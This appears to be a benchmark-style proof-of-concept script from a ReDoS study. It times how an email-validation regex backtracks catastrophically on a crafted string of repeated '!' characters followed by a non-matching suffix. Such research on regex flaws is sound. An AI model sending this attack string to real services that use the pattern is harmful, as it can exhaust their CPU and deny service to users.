# 1338
# ^([\!#\$%&'\*\+/\=?\^`\{\|\}~a-zA-Z0-9_-]+[\.]?)+[\!#\$%&'\*\+/\=?\^`\{\|\}~a-zA-Z0-9_-]+@{1}((([0-9A-Za-z_-]+)([\.]{1}[0-9A-Za-z_-]+)*\.{1}([A-Za-z]){1,6})|(([0-9]{1,3}[\.]{1}){3}([0-9]{1,3}){1}))$
# EXPONENT
# nums:4
# EXPONENT AttackString:""+"!"*32+"!1 __NQ"

import re
from time import perf_counter

regex = """^([\!#\$%&'\*\+/\=?\^`\{\|\}~a-zA-Z0-9_-]+[\.]?)+[\!#\$%&'\*\+/\=?\^`\{\|\}~a-zA-Z0-9_-]+@{1}((([0-9A-Za-z_-]+)([\.]{1}[0-9A-Za-z_-]+)*\.{1}([A-Za-z]){1,6})|(([0-9]{1,3}[\.]{1}){3}([0-9]{1,3}){1}))$"""
REGEX = re.compile(regex)
for i in range(0, 150000):
    ATTACK = "" + "!" * i * 1 + "!1 __NQ"
    LEN = len(ATTACK)
    BEGIN = perf_counter()
    m = REGEX.search(ATTACK)
    # m = REGEX.match(ATTACK)
    DURATION = perf_counter() - BEGIN
    print(f"{i *1}: took {DURATION} seconds!")